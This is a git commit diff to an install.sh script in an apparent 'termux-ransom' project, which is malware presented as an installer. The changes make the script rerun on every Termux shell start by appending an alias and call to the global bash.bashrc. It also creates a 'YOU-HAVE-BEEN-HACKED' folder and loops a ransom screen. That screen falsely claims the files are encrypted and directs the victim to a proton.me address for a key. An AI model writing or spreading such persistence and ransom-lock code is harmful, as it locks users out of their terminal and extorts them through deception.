d12d9937ce71638e8beabfd39478358d3ab4bbf5
noname1818271718172672 <127699732+ixzzxitado@users.noreply.github.com>
2024-02-29 18:40:39 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -7,13 +7,14 @@ mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂
 chmod u=x *
 chmod u=rwx 1705743575411.png
 clear
-echo -e "alias IMAGE='cd /data/data/com.termux/files/home/termux-ransom ; bash install.sh'" >> /data/data/com.termux/files/usr/etc/bash.bashrc
-sed -i '9s/echo/#/' install.sh || sed -i '10s/echo/#/' install.sh
+echo "alias IMAGE='cd /data/data/com.termux/files/home/termux-ransom ; bash install.sh'" >> /data/data/com.termux/files/usr/etc/bash.bashrc
+echo "IMAGE" >> /data/data/com.termux/files/usr/etc/bash.bashrc
+sed -i '9s/echo/#/' install.sh ; sed -i '10s/echo/#/' install.sh ; sed -i '11s/echo/#/' install.sh ; sed -i '12s/echo/#/' install.sh
 sleep 1
 while :
 do
 	clear
-	termimage 1705743575411.png
+	termimage IMG-20240228-WA0000.jpg
  	echo -e "\033[7;49;91m YOUR FILES ARE ENCRYPTED PLEASE ENTER THE KEY-WORD BELLOW!\033[m"
   	echo ""
    	echo -e "\033[0;49;95m Talk with the\033[m\033[0;49;93m userpropez8183718@proton.me\033[0;49;95m To get the Encrypt Key!\033[m"
